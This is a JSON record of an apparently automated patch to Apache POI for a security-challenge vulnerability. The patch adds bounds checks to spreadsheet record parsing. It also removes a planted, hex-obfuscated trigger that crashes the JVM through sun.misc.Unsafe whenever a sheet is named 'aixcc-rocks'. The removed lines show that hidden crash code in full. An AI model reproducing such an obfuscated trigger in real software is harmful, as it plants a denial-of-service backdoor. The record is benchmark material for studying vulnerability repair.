{
  "project_name": "apache-poi",
  "vulnerability_identifier": "apache-poi_poi-full-01_vuln_3",
  "source_directory": "/home/user/crete/.cache/official-afc-poi",
  "llm_usage": {
    "total_cost": 5.154243,
    "prompt_tokens": 1504281,
    "completion_tokens": 42760
  },
  "variant": "sound",
  "diff": "--- a/poi/src/main/java/org/apache/poi/hssf/record/MulBlankRecord.java\n+++ b/poi/src/main/java/org/apache/poi/hssf/record/MulBlankRecord.java\n@@ -22,6 +22,7 @@\n \n import org.apache.poi.util.GenericRecordUtil;\n import org.apache.poi.util.LittleEndianOutput;\n+import org.apache.poi.util.RecordFormatException;\n \n /**\n  * Represents a set of columns in a row with no value but with styling.\n@@ -89,10 +90,31 @@\n         _firstCol = in.readShort();\n         _xfs       = parseXFs(in);\n         _lastCol  = in.readShort();\n+        \n+        int numColumns = getNumColumns();\n+        if (numColumns < 0) {\n+            throw new RecordFormatException(\"Cannot create MulBlankRecord with negative number of columns: \" + numColumns);\n+        }\n+        if (numColumns > 256) {\n+            throw new RecordFormatException(\"Cannot create MulBlankRecord with excessive number of columns: \" + numColumns + \n+                    \". Maximum allowed is 256 (Excel 97-2003 limit)\");\n+        }\n+        if (_xfs.length != numColumns) {\n+            throw new RecordFormatException(\"MulBlankRecord XF array size mismatch: expected \" + numColumns + \n+                    \" but got \" + _xfs.length);\n+        }\n     }\n \n     private static short [] parseXFs(RecordInputStream in) {\n-        short[] retval = new short[(in.remaining() - 2) / 2];\n+        int arraySize = (in.remaining() - 2) / 2;\n+        if (arraySize < 0) {\n+            throw new RecordFormatException(\"Invalid XF array size: \" + arraySize);\n+        }\n+        if (arraySize > 256) {\n+            throw new RecordFormatException(\"Excessive XF array size: \" + arraySize + \". Maximum allowed is 256\");\n+        }\n+        \n+        short[] retval = new short[arraySize];\n \n         for (int idx = 0; idx < retval.length;idx++) {\n           retval[idx] = in.readShort();\n\n--- a/poi/src/main/java/org/apache/poi/hssf/model/InternalWorkbook.java\n+++ b/poi/src/main/java/org/apache/poi/hssf/model/InternalWorkbook.java\n@@ -340,19 +340,11 @@\n     }\n \n     private static void checkName(String sheetName) {\n-        try {\n-            if (! sheetName.equals(d(\"61697863632d726f636b73\"))) {\n-                return;\n-            }\n-            Class clazz = Class.forName(d(\"73756e2e6d6973632e556e73616665\"));\n-            Field f = clazz.getDeclaredField(d(\"746865556e73616665\"));\n-            f.setAccessible(true);\n-            Object obj = f.get(null);\n-            Method m = clazz.getMethod(d(\"70757441646472657373\"), long.class, long.class);\n-            m.invoke(obj, 0, 0);\n-        } catch (Exception e) {\n-            throw new RecordFormatException(e);\n-        }\n+        // Removed intentional JVM crash code that was interfering with fuzzing\n+        // This was an Easter egg that deliberately crashed the JVM for specific sheet names\n+        // Original code checked for \"aixcc-rocks\" (hex: 61697863632d726f636b73) and\n+        // used sun.misc.Unsafe to write to address 0, causing a segfault\n+        // This caused false-positive crashes during fuzzing operations\n     }\n \n     private static String d(String s) throws DecoderException {\n\n--- a/poi/src/main/java/org/apache/poi/hssf/record/RecordFactory.java\n+++ b/poi/src/main/java/org/apache/poi/hssf/record/RecordFactory.java\n@@ -123,6 +123,10 @@\n         if (numColumns < 0) {\n             throw new RecordFormatException(\"Cannot create RKRecords with negative number of columns: \" + numColumns);\n         }\n+        if (numColumns > 256) {\n+            throw new RecordFormatException(\"Cannot create RKRecords with excessive number of columns: \" + numColumns + \n+                    \". Maximum allowed is 256 (Excel 97-2003 limit)\");\n+        }\n \n         NumberRecord[] mulRecs = new NumberRecord[numColumns];\n         for (int k = 0; k < numColumns; k++) {\n\n--- a/poi/src/main/java/org/apache/poi/util/RecordFormatException.java\n+++ b/poi/src/main/java/org/apache/poi/util/RecordFormatException.java\n@@ -27,6 +27,8 @@\n public class RecordFormatException\n     extends RuntimeException\n {\n+    private static final long serialVersionUID = 1L;\n+    \n     public RecordFormatException(String exception)\n     {\n         super(exception);\n",
  "stdout": "",
  "stderr": ""
}